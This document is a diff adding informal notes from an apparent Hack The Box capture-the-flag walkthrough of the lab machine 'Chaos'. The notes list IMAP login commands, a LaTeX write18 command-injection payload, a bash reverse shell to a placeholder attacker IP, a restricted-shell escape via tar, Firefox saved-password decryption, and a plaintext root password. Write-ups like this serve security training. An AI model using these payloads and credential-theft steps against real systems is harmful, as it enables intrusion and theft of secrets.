@@ -1,0 +1,56 @@
+after nmap we got 80 and 993
+
+80 we found wordpress
+
+993 its look like pop mail server
+
+wp i got username ayush passowrd jiujitsu
+
+
+openssl s_client -connect 10.10.10.120:993
+
+a1 LOGIN ayush jiujitsu
+a2 LIST "" "*"
+a3 EXAMINE Drafts
+a4 FETCH 1 BODY[]
+
+we got some base64 file just decode 
+
+https://github.com/bing0o/Python-Scripts/blob/master/crypto.py
+
+after docode i found http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+enmurat pdfTex software 
+
+https://0x90r00t.com/2016/02/29/internetwache-ctf-2016-web-90-texmaker-write-up/.
+
+payload "\immediate\write18{id} "
+
+payload " /bin/bash -c "bash -i >& /dev/tcp/MyIPAddress/9001 0>&1" "
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+export TERM=xterm
+
+shell bypass 
+
+https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+
+export SHELL="/bin/bash"
+
+tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+There was a .mozilla data directory there. I went there and there was a directory for Firefox and it had a profile :
+
+https://github.com/unode/firefox_decrypt
+
+python3 firefox_decode.py /home/ayush/.mozilla/firefox/bzo7sjt1.default/
+
+i gave auysh pass got root pass
+
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
